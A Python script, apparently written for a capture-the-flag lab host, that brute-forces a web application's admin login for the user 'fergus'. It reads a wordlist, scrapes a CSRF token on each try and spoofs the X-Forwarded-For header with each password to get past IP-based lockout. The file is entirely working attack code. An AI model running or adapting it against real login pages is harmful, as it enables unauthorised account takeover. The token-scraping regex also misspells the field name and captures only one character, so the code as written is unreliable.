import re
import requests

def abrir_diccionario(file_path):
    return [item.replace("\n","") for item in open(file_path).readlines()]
    #reemplazo salto de linea por "" para una mejor lectura

def brute():
    host="http://10.10.10.191"
    login_url=host+"/admin/login"
    username="fergus"
    wordlist=abrir_diccionario('path con el diccionario')

    for password in wordlist:
        session=requests.session()
        login_page=session.get(login_url)
        print(str(login_page.text))
        csrf_token=re.search('input.+?name="tokenCTRF.+?value="(.+?)',login_page.text).group(1)

        print("[+] Trying: {p}".format(p=password))

        headers={
            'X-Forwarded-For':password,
            'User-Agent':"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
            'Referer':login_url
        }

        data={
            'tokenCSRF':csrf_token,
            'username':username,
            'password':password,
            'save':''
        }

        login_result=session.post(login_url,headers=headers,data=data,allow_redirects=False)

        if'location' in login_result.headers:
            if 'admin/dashboard' in login_result.headers['location']:
                print()
                print("SUCCESS: PASSWORD FOUND!")
                print("Use {u}:{p}".format(u=username,p=password))
                print()
                break

def main():
    brute()

if __name__ == '__main__':
    main()